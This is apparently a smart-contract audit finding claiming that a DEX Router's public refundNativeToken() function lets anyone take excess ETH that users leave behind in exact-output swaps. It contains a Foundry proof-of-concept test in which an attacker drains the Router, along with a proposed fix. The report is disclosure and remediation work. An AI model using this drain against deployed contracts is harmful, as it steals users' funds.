## Title
Incorrect ETH Amount Handling in Router Allows Fund Theft via Unprotected refundNativeToken Function

## Summary
The Router.sol contract's ternary logic for native token value calculation (lines 106-110) creates a vulnerability where excess ETH sent by users during exact output swaps remains in the Router contract. The unprotected `refundNativeToken()` function allows any attacker to steal this excess ETH since it sends the entire Router balance to `msg.sender` without verifying the original sender.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The ternary operation determines when to send ETH upfront to the Core contract. It should ensure that all ETH sent by users is either used in the swap or properly refunded to the original sender.

**Actual Logic:** The ternary only sends ETH upfront for exact input swaps on token0 (native). For exact output swaps where users buy token1 with ETH, the Router:
1. Receives user's ETH via `msg.value` (user sends excess to cover potential costs)
2. Calls Core.swap with `value=0` [2](#0-1) 
3. After the swap, sends only the required amount to the Core via SafeTransferLib [3](#0-2) 
4. Leaves excess ETH in the Router contract with no automatic refund mechanism

**Exploitation Path:**
1. **Victim Transaction**: User calls `Router.swap{value: 200 ether}()` for an exact output swap to buy token1 with ETH
   - Parameters: `params.isToken1() = true`, `params.amount() = -100` (exact output)
   - Ternary evaluates to false (condition: `!true && !true && true = false`)
   - `value = 0` is sent to Core
2. **State Change**: Swap executes with actual cost of 120 ETH
   - `balanceUpdate.delta0 = 120` (user owes 120 ETH)
   - `valueDifference = 0 - 120 = -120` [4](#0-3) 
   - Router sends 120 ETH to Core, 80 ETH remains in Router [5](#0-4) 
3. **Attacker Front-runs**: Attacker monitors mempool, sees Router has 80 ETH balance
   - Attacker calls `router.refundNativeToken()`
4. **Fund Theft**: The `refundNativeToken()` function sends all Router balance to attacker [6](#0-5) 
   - Function sends to `msg.sender` (attacker), not original user
   - Victim permanently loses 80 ETH

**Security Property Broken:** Direct theft of user funds - violates the fundamental security principle that user assets should only be transferred to intended recipients.

## Impact Explanation
- **Affected Assets**: Native ETH sent by users for exact output swaps where token0 is NATIVE_TOKEN_ADDRESS
- **Damage Severity**: Users can lose 100% of their excess ETH. In high-slippage scenarios or when users send significantly more than needed "to be safe", losses can be substantial (e.g., user sends 1 ETH but swap needs 0.5 ETH → loses 0.5 ETH)
- **User Impact**: Any user performing exact output swaps with ETH is vulnerable. This includes:
  - Direct calls to `Router.swap()` with exact output parameters
  - Multi-hop swaps via `multihopSwap()` or `multiMultihopSwap()` where specified token is native [7](#0-6) 

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user or MEV bot monitoring the mempool
- **Preconditions**: 
  - Pool with token0 = NATIVE_TOKEN_ADDRESS exists and has liquidity
  - User performs exact output swap where they send excess ETH
- **Execution Complexity**: Single transaction - attacker simply calls `refundNativeToken()` 
- **Frequency**: Can be exploited continuously - every time a user leaves excess ETH in Router, any attacker can steal it immediately

## Recommendation

**Primary Fix**: Modify the refund logic to track and return excess ETH to the original sender within the same transaction: [8](#0-7) 

```solidity
// In src/Router.sol, handleLockData function, lines 133-146:

// CURRENT (vulnerable):
// Line 135: valueDifference calculation doesn't account for msg.value received
// Line 141: Sends calculated amount but doesn't refund excess to swapper

// FIXED:
if (balanceUpdate.delta0() != 0) {
    if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
        uint256 actualRequired = uint256(uint128(balanceUpdate.delta0()));
        
        // Send required amount to ACCOUNTANT
        if (actualRequired > 0) {
            SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(actualRequired));
        }
        
        // Immediately refund any excess to the original swapper
        if (address(this).balance > 0) {
            SafeTransferLib.safeTransferETH(swapper, address(this).balance);
        }
    } else {
        ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
    }
}
```

**Alternative Mitigation**: Restrict `refundNativeToken()` to only work within the same transaction context, but the primary fix is superior as it eliminates the need for users to explicitly call refund.

**Additional Recommendation**: Remove or restrict the public `refundNativeToken()` function since the proper pattern should handle all refunds automatically: [6](#0-5) 

## Proof of Concept
```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_RouterETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "./PoolTestBase.sol";

contract Exploit_RouterETHTheft is PoolTestBase {
    Router router;
    Core core;
    address victim = address(0x1234);
    address attacker = address(0x5678);
    
    function setUp() public {
        // Initialize core and router
        core = new Core();
        router = new Router(core);
        
        // Create ETH/Token pool
        PoolKey memory poolKey = createPool(NATIVE_TOKEN_ADDRESS, address(token1), 0, defaultConfig);
        createPosition(poolKey, -100, 100, 1000 ether, 1000 ether);
        
        // Fund victim with ETH
        vm.deal(victim, 10 ether);
    }
    
    function test_RouterETHTheft() public {
        PoolKey memory poolKey = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(token1),
            tickSpacing: 0,
            extension: address(0)
        });
        
        // SETUP: Victim wants to buy exactly 0.1 token1 with ETH
        // They send 2 ETH to be safe, but actual cost is only 0.15 ETH
        vm.startPrank(victim);
        
        uint256 victimBalanceBefore = victim.balance;
        
        // Exact output swap: buy 0.1 token1, pay with ETH
        router.swap{value: 2 ether}(
            poolKey,
            createSwapParameters({
                _isToken1: true,
                _amount: -0.1 ether,  // Exact output (negative)
                _sqrtRatioLimit: SqrtRatio.wrap(0),
                _skipAhead: 0
            }),
            -2 ether  // Max willing to pay
        );
        
        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 0, "Router should have excess ETH");
        
        vm.stopPrank();
        
        // EXPLOIT: Attacker sees Router has ETH and steals it
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBefore = attacker.balance;
        router.refundNativeToken();
        uint256 attackerBalanceAfter = attacker.balance;
        
        vm.stopPrank();
        
        // VERIFY: Attacker stole victim's excess ETH
        uint256 stolenAmount = attackerBalanceAfter - attackerBalanceBefore;
        assertEq(stolenAmount, routerBalance, "Attacker stole all excess ETH");
        assertGt(stolenAmount, 1.8 ether, "Significant ETH stolen (>1.8 ETH)");
        
        // Victim cannot recover their excess ETH
        assertEq(address(router).balance, 0, "No ETH left to refund to victim");
    }
}
```

**Notes:**
- This vulnerability affects both single swaps and multi-hop swaps where the specified token is native
- The issue exists because the Router contract is designed to be stateless but inadvertently holds user funds temporarily
- The `refundNativeToken()` function was likely intended for legitimate refunds via multicall, but its unrestricted nature creates a critical security flaw
- No tests exist for `refundNativeToken()` in the test suite, suggesting this attack vector was not considered during development
- The vulnerability is triggered specifically when `value=0` is passed to Core (exact output or token1 swaps with native token0), but user sends ETH via `msg.value`

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L114-114)
```text
                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```

**File:** src/Router.sol (L133-146)
```text
                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/Router.sol (L226-234)
```text
                if (totalSpecified < 0) {
                    ACCOUNTANT.withdraw(specifiedToken, swapper, uint128(uint256(-totalSpecified)));
                } else if (totalSpecified > 0) {
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
                    }
                }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
